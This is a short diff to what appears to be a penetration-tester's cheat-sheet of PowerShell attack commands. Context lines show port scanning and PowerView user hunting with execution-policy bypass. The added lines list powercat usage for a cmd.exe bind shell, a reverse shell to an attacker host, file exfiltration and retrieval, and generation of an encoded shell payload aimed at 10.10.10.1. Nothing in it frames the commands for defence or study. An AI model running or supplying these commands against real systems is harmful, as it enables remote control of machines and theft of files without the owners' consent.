@@ -56,3 +56,13 @@ Invoke-PortScan -StarAddress 192.168.1.1 -EndAddress 192.168.1.255 -ResolveHost
 //PowerView
 powershell.exe -exec bypass -Command "& (Import-Module c:\PowerView.ps1; Invoke-UserHunter)"
 //
+
+
+//Powercat
+powercat -l -p 8080 -e cmd.exe -v #target use powercat listen 8080 bind cmd.exe
+powercat -c attack -p 8888 -v -e cmd.exe #revse shell
+powercat -l -p 9999 -of c:\file.txt -v #transfer file
+powercat -c target -p 9999 -i c:\file.txt #get file
+powercat -l -p 8000 -e cmd -v -g >> shell.ps1\
+powercat -c 10.10.10.1 -p 9999 -ep -ge #編碼payload
+//
